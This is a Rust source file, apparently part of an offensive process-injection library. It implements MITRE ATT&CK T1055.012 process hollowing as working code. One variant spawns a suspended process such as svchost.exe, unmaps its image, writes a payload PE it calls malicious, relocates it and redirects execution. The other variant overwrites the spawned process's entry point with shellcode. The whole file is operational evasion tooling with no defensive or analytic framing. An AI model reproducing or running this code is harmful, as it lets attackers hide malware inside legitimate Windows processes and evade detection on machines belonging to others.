//! Implementation of **MITRE ATT&CK T1055.012: Process Hollowing**.
//!
//! This module implements the "Zombie Process" technique. It spawns a legitimate process
//! (e.g., `svchost.exe`) in a suspended state and replaces its memory contents with
//! a malicious payload.
//!
//! # Variants
//! * **Standard:** The classic approach. Unmaps the original executable section, allocates new memory,
//!   writes the PE payload, performs relocations, and redirects the thread context.
//! * **Entry Point Stomping:** A lighter variant. Does not unmap memory. Instead, it locates
//!   the Original Entry Point (OEP) of the target and overwrites it with Shellcode.

use std::{
    ffi::c_void,
    os::windows::ffi::OsStrExt,
    path::Path,
    ptr::{addr_of_mut, null, null_mut},
};

#[cfg(target_arch = "x86_64")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    CONTEXT_FULL_AMD64 as CONTEXT_FULL, IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS,
};
#[cfg(target_arch = "x86")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    CONTEXT_FULL_X86 as CONTEXT_FULL, IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS,
};

use windows_sys::{
    Wdk::System::{
        Memory::NtUnmapViewOfSection,
        Threading::{NtQueryInformationProcess, ProcessBasicInformation},
    },
    Win32::{
        Foundation::{CloseHandle, FALSE, GetLastError, HANDLE, INVALID_HANDLE_VALUE},
        System::{
            Diagnostics::Debug::{
                CONTEXT, GetThreadContext, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_SECTION_HEADER,
                ReadProcessMemory, SetThreadContext, WriteProcessMemory,
            },
            LibraryLoader::GetModuleHandleW,
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
            SystemServices::{IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER},
            Threading::{
                CREATE_SUSPENDED, CreateProcessW, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
                ResumeThread, STARTF_USESHOWWINDOW, STARTUPINFOW,
            },
        },
    },
    w,
};

use crate::{
    Error, Result, info,
    payload::Payload,
    strategy::{ProcessHollowing, Strategy, Technique},
    target::Target,
};

/// The concrete strategy implementation for T1055.012.
#[derive(Default)]
pub(crate) struct T1055_012;

impl Strategy for T1055_012 {
    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
        let info = technique.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        let method = match technique {
            Technique::T1055_012(m) => m,
            _ => return Err(Error::Execution("Internal dispatch error".into())),
        };

        // Process Hollowing inherently requires spawning a new process to "hollow" out.
        let target_path = match target {
            Target::Spawn(path) => path,
            _ => {
                return Err(Error::Validation(
                    "T1055.012 requires Target::Spawn(path)".into(),
                ));
            }
        };

        match method {
            // Standard: Requires a full PE (EXE/DLL) to replace the original.
            ProcessHollowing::Standard => {
                info!("Method: Process Hollowing -> Spawning {:?}", target_path);
                let image_bytes = match payload {
                    Payload::Executable {
                        image_bytes: Some(b),
                        ..
                    } => b,
                    Payload::DllFile {
                        image_bytes: Some(b),
                        ..
                    } => b,
                    Payload::Executable {
                        image_bytes: None, ..
                    }
                    | Payload::DllFile {
                        image_bytes: None, ..
                    } => {
                        return Err(Error::Validation(
                            "Payload file not loaded. Use Payload::from_file()".into(),
                        ));
                    }
                    _ => {
                        return Err(Error::Mismatch {
                            strategy: info.mitre_id,
                            variant: payload.variant_name(),
                        });
                    }
                };
                process_hollowing(image_bytes, target_path)
            }
            // Stomping: Requires Shellcode to overwrite the entry point.
            ProcessHollowing::EntryPointStomping => {
                info!("Method: Entry Point Stomping -> Spawning {:?}", target_path);
                let shellcode = match payload {
                    Payload::Shellcode { bytes: b, .. } => b,
                    _ => {
                        return Err(Error::Mismatch {
                            strategy: info.mitre_id,
                            variant: payload.variant_name(),
                        });
                    }
                };
                entry_point_injection(shellcode, target_path)
            }
        }
    }
}

/// A RAII (Resource Acquisition Is Initialization) wrapper for Windows Handles.
///
/// Ensures that `CloseHandle` is automatically called when the scope ends,
/// preventing resource leaks in the operating system.
struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

// Architecture-dependent offsets for the PEB (Process Environment Block)
#[cfg(target_pointer_width = "64")]
const OFFSET_IMAGE_BASE: usize = 0x10;
#[cfg(target_pointer_width = "32")]
const OFFSET_IMAGE_BASE: usize = 0x08;

/// Zero-cost wrapper for parsing PE Relocation Block Entries.
///
/// Format: 16 bits -> [4 bits Type | 12 bits Offset]
struct RelocationEntry(u16);

impl RelocationEntry {
    /// The offset relative to the block's VirtualAddress.
    fn offset(&self) -> u16 {
        self.0 & 0x0FFF
    }

    /// The relocation type (e.g., IMAGE_REL_BASED_HIGHLOW).
    fn type_(&self) -> u16 {
        (self.0 & 0xF000) >> 12
    }
}

/// Performs **Standard Process Hollowing**.
///
/// # Logic Flow
/// 1. **Parse Payload:** Read headers of the malicious PE to know size and preferred base.
/// 2. **Spawn Target:** Create suspended process (`CreateProcessW`).
/// 3. **Unmap:** Find the target's base address via `NtQueryInformationProcess` and unmap it (`NtUnmapViewOfSection`).
/// 4. **Alloc:** Allocate memory at the *same* base address if possible, or elsewhere if needed.
/// 5. **Write:** Copy headers and sections of the malicious PE into the target.
/// 6. **Relocate:** If the new base address != preferred base, apply Delta Relocations.
/// 7. **Context Switch:** Update the thread's `EAX`/`RCX` register to point to the new Entry Point.
/// 8. **Resume:** Resume execution.
fn process_hollowing(image_bytes: &[u8], target_path: &Path) -> Result<()> {
    // 0. Prepare Mutable Copy of Payload
    let mut local_image = image_bytes.to_vec();
    let local_image_ptr = local_image.as_mut_ptr();

    // 1. Parse Payload PE Headers
    if local_image.len() < size_of::<IMAGE_DOS_HEADER>() {
        return Err(Error::InvalidImage("Payload too small".into()));
    }

    let dos_header = unsafe { &*(local_image_ptr as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != 0x5A4D {
        return Err(Error::InvalidImage("Invalid PE Signature".into()));
    }

    let nt_headers_offset = dos_header.e_lfanew as usize;
    let nt_headers =
        unsafe { &mut *(local_image_ptr.add(nt_headers_offset) as *mut IMAGE_NT_HEADERS) };

    let image_size = nt_headers.OptionalHeader.SizeOfImage as usize;
    let preferred_base_addr = nt_headers.OptionalHeader.ImageBase as usize;

    info!(
        "Source Payload: Size: {:#x}, Preferred Base: {:#x}",
        image_size, preferred_base_addr
    );

    // 2. Spawn Target Process (Suspended)
    let startup_info = STARTUPINFOW {
        cb: size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTF_USESHOWWINDOW,
        ..Default::default()
    };

    let mut process_info = PROCESS_INFORMATION::default();
    let path_utf16 = to_utf16_null_terminated(target_path);

    let success = unsafe {
        CreateProcessW(
            path_utf16.as_ptr(),
            null_mut(),
            null(),
            null(),
            FALSE,
            CREATE_SUSPENDED,
            null(),
            null(),
            &startup_info,
            &mut process_info,
        )
    };

    if success == 0 {
        return Err(Error::Win32("CreateProcessW", unsafe { GetLastError() }));
    }

    let process_guard = HandleGuard::new(process_info.hProcess);
    let thread_guard = HandleGuard::new(process_info.hThread);

    // 3. Get Target ImageBase & Unmap
    // We use the undocumented NtQueryInformationProcess to read the PEB.
    let mut basic_info = PROCESS_BASIC_INFORMATION::default();
    let mut return_len: u32 = 0;

    let nt_status = unsafe {
        NtQueryInformationProcess(
            process_guard.0,
            ProcessBasicInformation,
            addr_of_mut!(basic_info).cast(),
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
        )
    };

    if nt_status != 0 {
        return Err(Error::Execution(format!(
            "NtQueryInformationProcess failed: {:#x}",
            nt_status
        )));
    }

    let remote_base_ptr = (basic_info.PebBaseAddress as usize + OFFSET_IMAGE_BASE) as *mut c_void;

    let mut remote_base_addr: usize = 0;
    let mut read_len: usize = 0;

    unsafe {
        ReadProcessMemory(
            process_guard.0,
            remote_base_ptr,
            addr_of_mut!(remote_base_addr).cast(),
            size_of::<usize>(),
            &mut read_len,
        );
    }

    info!("Target Image Base: {:#x}", remote_base_addr);

    // Unmap the original executable to free the address space.
    let unmap_status =
        unsafe { NtUnmapViewOfSection(process_guard.0, remote_base_addr as *mut c_void) };

    if unmap_status != 0 {
        return Err(Error::Execution(format!(
            "NtUnmapViewOfSection failed: {:#x}",
            unmap_status
        )));
    }

    // 4. Allocate Memory
    // We attempt to allocate at the target's original base address first.
    let alloc_base_addr = unsafe {
        VirtualAllocEx(
            process_guard.0,
            remote_base_addr as *mut c_void,
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if alloc_base_addr.is_null() {
        return Err(Error::Execution(format!(
            "Failed to allocate memory at target base address {:#x}.",
            remote_base_addr
        )));
    }

    // Calculate Delta: Difference between where we wanted to be (Preferred) vs where we are (Allocated).
    let delta = (alloc_base_addr as isize).wrapping_sub(preferred_base_addr as isize);
    info!("Allocation Successful. Delta: {:#x}", delta);

    // 5. Patch Payload Headers (Local)
    // We must update the ImageBase in the payload's headers before writing it.
    #[cfg(target_arch = "x86")]
    {
        nt_headers.OptionalHeader.ImageBase = alloc_base_addr as u32;
    }
    #[cfg(target_arch = "x86_64")]
    {
        nt_headers.OptionalHeader.ImageBase = alloc_base_addr as u64;
    }

    // 6. Write Headers to Target
    let headers_size = nt_headers.OptionalHeader.SizeOfHeaders as usize;
    let mut write_len = 0;

    unsafe {
        WriteProcessMemory(
            process_guard.0,
            alloc_base_addr,
            local_image_ptr.cast(),
            headers_size,
            &mut write_len,
        )
    };

    // 7. Write Sections to Target
    let section_header_offset = nt_headers_offset + size_of::<IMAGE_NT_HEADERS>();
    let section_count = nt_headers.FileHeader.NumberOfSections;

    for i in 0..section_count {
        let offset = section_header_offset + (i as usize * size_of::<IMAGE_SECTION_HEADER>());
        let section = unsafe { &*(local_image_ptr.add(offset) as *const IMAGE_SECTION_HEADER) };
        if section.SizeOfRawData == 0 {
            continue;
        }

        let remote_section_addr =
            (alloc_base_addr as usize + section.VirtualAddress as usize) as *mut c_void;
        let local_section_ptr = unsafe { local_image_ptr.add(section.PointerToRawData as usize) };

        unsafe {
            WriteProcessMemory(
                process_guard.0,
                remote_section_addr,
                local_section_ptr.cast(),
                section.SizeOfRawData as usize,
                &mut write_len,
            )
        };
    }

    // 8. Apply Relocations
    // If we couldn't load the payload at its preferred address (Delta != 0), we must patch absolute addresses.
    if delta != 0 {
        info!("Applying relocations...");
        let relocation_dir =
            nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

        if relocation_dir.Size == 0 {
            return Err(Error::InvalidImage(
                "Payload requires relocation but has no .reloc section.".into(),
            ));
        }

        // Find raw file offset of .reloc section
        let mut reloc_file_offset = 0;
        for i in 0..section_count {
            let offset = section_header_offset + (i as usize * size_of::<IMAGE_SECTION_HEADER>());
            let section = unsafe { &*(local_image_ptr.add(offset) as *const IMAGE_SECTION_HEADER) };
            let start = section.VirtualAddress;
            let end = start + section.SizeOfRawData;
            if relocation_dir.VirtualAddress >= start && relocation_dir.VirtualAddress < end {
                reloc_file_offset = section.PointerToRawData
                    + (relocation_dir.VirtualAddress - section.VirtualAddress);
                break;
            }
        }

        if reloc_file_offset != 0 {
            let mut current_reloc_offset = 0;
            while current_reloc_offset < relocation_dir.Size {
                let block_header = unsafe {
                    &*(local_image_ptr.add((reloc_file_offset + current_reloc_offset) as usize)
                        as *const IMAGE_BASE_RELOCATION)
                };
                current_reloc_offset += size_of::<IMAGE_BASE_RELOCATION>() as u32;

                let entry_count =
                    (block_header.SizeOfBlock - size_of::<IMAGE_BASE_RELOCATION>() as u32) / 2;
                let entries = unsafe {
                    local_image_ptr.add((reloc_file_offset + current_reloc_offset) as usize)
                        as *const u16
                };

                for i in 0..entry_count {
                    let entry_val = unsafe { *entries.add(i as usize) };
                    let entry = RelocationEntry(entry_val);

                    // Type 0 is padding, skip it.
                    if (entry.type_() as u32) == 0 {
                        continue;
                    }

                    // Calculate where in the remote process the patch is needed
                    let patch_relative_addr = block_header.VirtualAddress + entry.offset() as u32;
                    let remote_patch_addr =
                        (alloc_base_addr as usize + patch_relative_addr as usize) as *mut c_void;

                    // Read original value -> Add Delta -> Write back
                    let mut original_val: usize = 0;
                    unsafe {
                        ReadProcessMemory(
                            process_guard.0,
                            remote_patch_addr,
                            addr_of_mut!(original_val).cast(),
                            size_of::<usize>(),
                            &mut read_len,
                        )
                    };

                    let mut patched_val = (original_val as isize + delta) as usize;
                    unsafe {
                        WriteProcessMemory(
                            process_guard.0,
                            remote_patch_addr,
                            addr_of_mut!(patched_val).cast(),
                            size_of::<usize>(),
                            &mut write_len,
                        )
                    };
                }
                current_reloc_offset += entry_count * 2;
            }
        }
    }

    // 9. Redirect Execution (Context Switch)
    // We update the thread context to point to the new Entry Point.
    let mut context: CONTEXT = CONTEXT {
        ContextFlags: CONTEXT_FULL,
        ..Default::default()
    };

    unsafe { GetThreadContext(thread_guard.0, &mut context) };

    let entry_point_rva = nt_headers.OptionalHeader.AddressOfEntryPoint;
    let new_entry_point = (alloc_base_addr as usize + entry_point_rva as usize) as u64;

    #[cfg(target_arch = "x86")]
    {
        context.Eax = new_entry_point as u32;
    }
    #[cfg(target_arch = "x86_64")]
    {
        context.Rcx = new_entry_point;
    }

    unsafe { SetThreadContext(thread_guard.0, &context) };
    unsafe { ResumeThread(thread_guard.0) };

    Ok(())
}

/// Performs **Entry Point Stomping**.
///
/// # Logic Flow
/// 1. **Spawn Target:** Create suspended process.
/// 2. **Find Entry Point:**
///    * Use `NtQueryInformationProcess` to get PEB.
///    * Read PEB -> ImageBase.
///    * Read DOS Header -> NT Headers -> EntryPoint RVA.
/// 3. **Write Shellcode:** Overwrite the memory at `ImageBase + EntryPointRVA` with the shellcode.
/// 4. **Resume:** Resume the thread. The process will immediately execute the shellcode
///    believing it is the legitimate entry point.
fn entry_point_injection(shellcode: &[u8], target_path: &Path) -> Result<()> {
    // 1. Resolve NtQueryInformationProcess
    let ntdll_name = w!("ntdll.dll");
    let module_handle = unsafe { GetModuleHandleW(ntdll_name) };

    if module_handle.is_null() {
        return Err(Error::Win32("GetModuleHandleW(ntdll)", unsafe {
            GetLastError()
        }));
    }

    // 2. Spawn Process (Suspended)
    let startup_info = STARTUPINFOW {
        cb: size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTF_USESHOWWINDOW,
        ..Default::default()
    };

    let mut process_info = PROCESS_INFORMATION::default();
    let path_utf16 = to_utf16_null_terminated(target_path);

    info!("Spawning suspended process: {:?}", target_path);

    let success = unsafe {
        CreateProcessW(
            path_utf16.as_ptr(),
            null_mut(),
            null(),
            null(),
            FALSE,
            CREATE_SUSPENDED,
            null(),
            null(),
            &startup_info,
            &mut process_info,
        )
    };

    if success == 0 {
        return Err(Error::Win32("CreateProcessW", unsafe { GetLastError() }));
    }

    let process_guard = HandleGuard::new(process_info.hProcess);
    let thread_guard = HandleGuard::new(process_info.hThread);

    // 3. Query Process Information (PBI)
    let mut basic_info = PROCESS_BASIC_INFORMATION::default();
    let mut return_len: u32 = 0;

    let nt_status = unsafe {
        NtQueryInformationProcess(
            process_guard.0,
            ProcessBasicInformation,
            addr_of_mut!(basic_info).cast(),
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
        )
    };

    if nt_status != 0 {
        return Err(Error::Execution(format!(
            "NtQueryInformationProcess failed with status: {:#x}",
            nt_status
        )));
    }

    // 4. Read ImageBaseAddress from PEB
    let peb_image_base_ptr =
        (basic_info.PebBaseAddress as usize + OFFSET_IMAGE_BASE) as *const c_void;
    let mut remote_base_addr: usize = 0;
    let mut read_len: usize = 0;

    let success = unsafe {
        ReadProcessMemory(
            process_guard.0,
            peb_image_base_ptr,
            addr_of_mut!(remote_base_addr).cast(),
            size_of::<usize>(),
            &mut read_len,
        )
    };

    if success == 0 || read_len != size_of::<usize>() {
        return Err(Error::Win32("ReadProcessMemory (PEB)", unsafe {
            GetLastError()
        }));
    }

    // 5. Read DOS Header
    let mut dos_header = IMAGE_DOS_HEADER::default();

    let success = unsafe {
        ReadProcessMemory(
            process_guard.0,
            remote_base_addr as *const _,
            addr_of_mut!(dos_header).cast(),
            size_of::<IMAGE_DOS_HEADER>(),
            &mut read_len,
        )
    };

    if success == 0 {
        return Err(Error::Win32("ReadProcessMemory (DOS Header)", unsafe {
            GetLastError()
        }));
    }

    // 6. Read NT Headers to find EntryPoint RVA
    let nt_headers_ptr = (remote_base_addr + dos_header.e_lfanew as usize) as *const c_void;
    let mut nt_headers = IMAGE_NT_HEADERS::default();

    let success = unsafe {
        ReadProcessMemory(
            process_guard.0,
            nt_headers_ptr,
            addr_of_mut!(nt_headers).cast(),
            size_of::<IMAGE_NT_HEADERS>(),
            &mut read_len,
        )
    };

    if success == 0 {
        return Err(Error::Win32("ReadProcessMemory (NT Headers)", unsafe {
            GetLastError()
        }));
    }

    let entry_point_rva = nt_headers.OptionalHeader.AddressOfEntryPoint;
    let remote_entry_point = (remote_base_addr + entry_point_rva as usize) as *mut c_void;

    info!(
        "Image Base: {:#x}, Entry Point RVA: {:#x}, Target Address: {:p}",
        remote_base_addr, entry_point_rva, remote_entry_point
    );

    // 7. Write Shellcode Over Entry Point
    let mut write_len = 0;

    let success = unsafe {
        WriteProcessMemory(
            process_guard.0,
            remote_entry_point,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut write_len,
        )
    };

    if success == 0 {
        let err = unsafe { GetLastError() };
        return Err(Error::Win32("WriteProcessMemory", err));
    }

    // 8. Resume Thread
    info!("Shellcode written. Resuming main thread...");
    let result = unsafe { ResumeThread(thread_guard.0) };

    if result == u32::MAX {
        return Err(Error::Win32("ResumeThread", unsafe { GetLastError() }));
    }

    Ok(())
}

/// Helper: Converts a Rust Path to a null-terminated UTF-16 vector.
fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
    path.as_os_str().encode_wide().chain([0]).collect()
}
